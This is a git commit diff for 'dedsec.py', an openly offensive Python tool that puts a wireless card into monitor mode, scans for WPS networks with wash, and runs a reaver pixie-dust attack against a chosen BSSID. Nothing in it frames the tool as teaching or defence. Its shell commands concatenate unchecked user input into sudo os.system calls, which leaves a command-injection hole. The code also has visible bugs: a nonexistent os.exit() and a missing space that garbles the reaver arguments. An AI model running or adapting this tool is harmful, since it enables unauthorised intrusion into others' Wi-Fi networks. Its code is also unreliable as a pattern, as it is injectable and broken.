4e592103c19618bdd44a6ec26c45ee2ec507a6ab
localhost <74537225+0xbitx@users.noreply.github.com>
2022-04-21 09:24:23 +0800

    Update dedsec.py

--- dedsec.py
+++ dedsec.py
@@ -40,13 +40,13 @@ banner()
 
 def check_interface():
 	print("")
-	os.system("iw dev")
+	os.system("iw dev | grep -e Interface -e type")
 	print("")
 	
 def monitor_mode():
 	os.system("clear")
 	check_interface()
-	i = raw_input("Interface: ")
+	i = str(input("Interface: "))
 	os.system("sudo ifconfig " +i+ " down")
 	os.system("sudo iwconfig " +i+ " mode monitor")
 	os.system("sudo ifconfig " +i+ " up")
@@ -54,7 +54,7 @@ def monitor_mode():
 def managed_mode():
 	os.system("clear")
 	check_interface()
-	i = raw_input("Interface: ")
+	i = str(input("Interface: "))
 	os.system("sudo ifconfig " +i+ " down")
 	os.system("sudo iwconfig " +i+ " mode managed")
 	os.system("sudo ifconfig " +i+ " up")
@@ -64,31 +64,31 @@ def managed_mode():
 def attack():
 	os.system("clear")
 	check_interface()
-	i = raw_input("Interface: ")
+	i = str(input("Interface: "))
 	os.system("clear")
 	print("[*] CTRL + C TO STOP SCANNING. [*]")
 	print("")
 	os.system("sudo wash -i " +i)
 	print("[*]-------------------------------------------------------------------[*]")
-	b = raw_input("[*]target bssid: ")
-	c = raw_input("[*]target channel: ")
+	b = str(input("[*]target bssid: "))
+	c = str(input("[*]target channel: "))
 	os.system("sudo reaver -i "+i+" -b " +b+ " -c " +c+ "-gt 14 -K 1 -N -vvv")
 	time.sleep(3)
 	
 def exit():
-	os.close()
+	os.exit()
 
 while True:
 	print("")
 	banner2()
-	code = int(input("[*] █ COMMAND █:"))
-	if code == (1):
+	code = input("[*] █ COMMAND █:")
+	if code == "1":
 		attack()
-	elif code == (2):
+	elif code == "2":
 		monitor_mode()
-	elif code == (3):
+	elif code == "3":
 		managed_mode()
-	elif code == (4):
+	elif code == "4":
 		exit()
 	else:
 		print("[*]//////////[*]")
@@ -97,4 +97,3 @@ while True:
 		print("")
 		time.sleep(2)
 		banner()
-
